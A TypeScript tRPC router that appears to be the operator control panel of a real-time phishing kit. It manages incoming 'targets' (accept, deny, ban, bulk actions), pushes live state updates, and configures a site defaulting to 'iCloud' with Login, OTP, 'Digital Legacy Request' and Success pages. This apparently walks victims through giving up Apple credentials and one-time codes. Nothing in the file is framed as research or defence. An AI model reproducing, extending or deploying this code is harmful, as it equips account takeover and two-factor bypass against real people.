import { z } from "zod";
import { prisma } from "@/lib/prisma";
import { publishTargetEvent, targetTopic } from "@/server/realtime/pubsub";
import { createTRPCRouter, publicProcedure } from "./init";

function publishState(targetId, payload) {
  publishTargetEvent(targetTopic(targetId, "intake_states"), payload);
}

export const appRouter = createTRPCRouter({
  targets: createTRPCRouter({
    listPending: publicProcedure.query(() =>
      prisma.targets.findMany({
        where: { status: "pending" },
        orderBy: { created_at: "desc" },
      }),
    ),
    listActive: publicProcedure.query(() =>
      prisma.targets.findMany({
        where: { status: "active" },
        orderBy: { created_at: "desc" },
      }),
    ),
    accept: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          operatorId: z.string().optional(),
        }),
      )
      .mutation(async ({ input }) => {
        const updated = await prisma.targets.update({
          where: { id: input.targetId },
          data: {
            status: "active",
            operator_id: input.operatorId ?? null,
          },
        });
        publishState(input.targetId, { type: "update" });
        return updated;
      }),
    deny: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .mutation(async ({ input }) => {
        const updated = await prisma.targets.update({
          where: { id: input.targetId },
          data: { status: "ended" },
        });
        publishState(input.targetId, { type: "update" });
        return updated;
      }),
    endAndBan: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .mutation(async ({ input }) => {
        const updated = await prisma.targets.update({
          where: { id: input.targetId },
          data: { status: "banned" },
        });
        publishState(input.targetId, { type: "update" });
        return updated;
      }),
    bulkDeny: publicProcedure
      .input(z.object({ targetIds: z.array(z.string()) }))
      .mutation(async ({ input }) => {
        if (input.targetIds.length === 0) return { count: 0 };
        const result = await prisma.targets.updateMany({
          where: { id: { in: input.targetIds }, status: "pending" },
          data: { status: "ended" },
        });
        for (const id of input.targetIds) {
          publishState(id, { type: "update" });
        }
        return { count: result.count };
      }),
    bulkEndAndBan: publicProcedure
      .input(z.object({ targetIds: z.array(z.string()) }))
      .mutation(async ({ input }) => {
        if (input.targetIds.length === 0) return { count: 0 };
        const result = await prisma.targets.updateMany({
          where: { id: { in: input.targetIds }, status: "active" },
          data: { status: "banned" },
        });
        for (const id of input.targetIds) {
          publishState(id, { type: "update" });
        }
        return { count: result.count };
      }),
  }),

  domains: createTRPCRouter({
    getConfig: publicProcedure
      .input(z.object({ slug: z.string().optional() }))
      .query(async ({ input }) => {
        const slug = (input.slug ?? "iCloud").toLowerCase().replace(/\s+/g, "-");
        const domain = await prisma.domains.findFirst({
          where: { slug },
        });
        return domain ?? {
          id: null,
          allow_new_visitors: true,
          default_pages: [{ name: "Login" }, { name: "OTP" }, { name: "Digital Legacy Request" }, { name: "Success" }],
        };
      }),
    updateConfig: publicProcedure
      .input(
        z.object({
          slug: z.string().optional(),
          allowNewVisitors: z.boolean().optional(),
          defaultPages: z.array(z.object({ name: z.string() })).optional(),
        }),
      )
      .mutation(async ({ input }) => {
        const slug = (input.slug ?? "iCloud").toLowerCase().replace(/\s+/g, "-").replace(/[^a-z0-9-]/g, "");
        let domain = await prisma.domains.findFirst({
          where: { slug },
        });
        if (!domain) {
          domain = await prisma.domains.create({
            data: {
              name: input.slug ?? "iCloud",
              slug,
              allow_new_visitors: input.allowNewVisitors ?? true,
              default_pages: input.defaultPages ?? [{ name: "Login" }, { name: "OTP" }, { name: "Digital Legacy Request" }, { name: "Success" }],
            },
          });
        } else {
          domain = await prisma.domains.update({
            where: { id: domain.id },
            data: {
              ...(input.allowNewVisitors !== undefined && { allow_new_visitors: input.allowNewVisitors }),
              ...(input.defaultPages !== undefined && { default_pages: input.defaultPages }),
            },
          });
        }
        return domain;
      }),
  }),
});
